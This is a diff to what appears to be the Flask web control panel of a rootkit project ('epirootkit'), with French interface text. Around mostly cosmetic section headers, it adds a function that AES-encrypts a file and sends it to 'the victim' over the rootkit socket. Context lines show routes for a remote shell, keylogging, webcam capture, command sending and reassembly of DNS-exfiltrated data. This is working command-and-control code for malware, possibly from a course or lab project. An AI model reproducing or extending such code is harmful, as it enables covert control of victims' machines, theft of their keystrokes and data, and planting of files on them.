@@ -38,7 +38,7 @@ exfil_buffer = {}
 last_channel = 'tcp'
 expected_chunks = None
 
-# -------------------- FLASK SETUP ----------------------
+# -------------------- FLASK SETUP ---------------------- #
 app = Flask(__name__)
 app.secret_key = "epirootkit_secret"
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
@@ -62,6 +62,8 @@ def login():
         return redirect(url_for('dashboard'))
     return render_template("login.html")
 
+# ---------------------------------------- WEB AUTH ---------------------------------------- #
+
 @app.route('/auth', methods=['POST'])
 def auth():
     global authenticated
@@ -71,6 +73,8 @@ def auth():
     flash("❌ Mot de passe incorrect.")
     return redirect(url_for('login'))
 
+# ---------------------------------------- DASHBOARD ---------------------------------------- #
+
 @app.route('/dashboard')
 def dashboard():
     if not authenticated:
@@ -78,11 +82,15 @@ def dashboard():
     status = "✅ Connecté" if rootkit_connection else "🔴 Déconnecté"
     return render_template("dashboard.html", status=status, rootkit_address=rootkit_address)
 
+# ---------------------------------------- TERMINAL ---------------------------------------- #
+
 @app.route('/terminal')
 def terminal():
     if not authenticated:
         return redirect(url_for('login'))
     return render_template("terminal.html", response=last_response, history=command_history, last_channel=last_channel)
+
+# ---------------------------------------- REMOTE SHELL ---------------------------------------- #
 
 @app.route('/shell_remote', methods=['GET', 'POST'])
 def shell_remote():
@@ -114,6 +122,8 @@ def shell_remote():
 
     return render_template("shell_remote.html", shell_output=shell_output)
 
+# ---------------------------------------- KEYLOGGER ---------------------------------------- #
+
 @app.route('/keylogger')
 def keylogger():
     if not authenticated:
@@ -138,18 +148,65 @@ def history():
         return redirect(url_for('login'))
     return render_template("history.html", history=command_history)
 
+# ---------------------------------------- UPLOAD ---------------------------------------- #
+
 @app.route('/upload', methods=['GET', 'POST'])
 def upload():
     if not authenticated:
         return redirect(url_for('login'))
+
     if request.method == 'POST':
         uploaded_file = request.files.get('file')
-        if uploaded_file:
+        remote_path = request.form.get('remote_path')
+
+        if uploaded_file and remote_path:
             filename = secure_filename(uploaded_file.filename)
-            save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-            uploaded_file.save(save_path)
-            flash(f"✅ Fichier '{filename}' uploadé.")
+            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            uploaded_file.save(local_path)
+
+            try:
+                upload_file_encrypted(local_path, remote_path)
+                flash(f"✅ Fichier '{filename}' uploadé et transmis à la victime.")
+            except Exception as e:
+                flash(f"❌ Erreur lors du transfert à la victime : {e}")
+
     return render_template("upload.html")
+
+
+def upload_file_encrypted(local_path, remote_path):
+    if not os.path.exists(local_path):
+        print(f"[!] Le fichier local '{local_path}' n'existe pas.")
+        return
+
+    try:
+        # Lire le fichier entier en binaire
+        with open(local_path, "rb") as f:
+            file_data = f.read()
+
+        # Chiffrer le contenu entier
+        encrypted_data = aes_encrypt(file_data)
+
+        # Envoi de la commande upload + chemin destination
+        send_to_server(rootkit_connection, f"upload {remote_path}")
+
+        # Attente du READY_TO_RECEIVE brut
+        ack = rootkit_connection.recv(1024).decode()
+        if ack.strip() != "READY_TO_RECEIVE":
+            print("[!] Erreur : la victime n'est pas prête.")
+            return
+
+        # Envoi des données chiffrées
+        rootkit_connection.sendall(encrypted_data)
+
+        # Marqueur de fin
+        rootkit_connection.sendall(b"EOF\n")
+
+        print(f"[+] Fichier '{local_path}' chiffré et envoyé avec succès vers '{remote_path}'.")
+
+    except Exception as e:
+        print(f"[!] Erreur upload chiffré : {e}")
+
+# ---------------------------------------- DOWNLOAD ---------------------------------------- #
 
 @app.route('/download')
 def download():
@@ -192,6 +249,8 @@ def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
     expected_chunks = None
     exfil_buffer.clear()
     return text
+
+# ---------------------------------------- SEND COMMAND ---------------------------------------- #
 
 @app.route('/send', methods=['POST'])
 def send():
@@ -280,6 +339,8 @@ def send():
             last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}
 
     return redirect(url_for('terminal'))
+
+# ---------------------------------------- WEBCAM ---------------------------------------- #
 
 @app.route('/webcam', methods=['GET', 'POST'])
 def webcam():
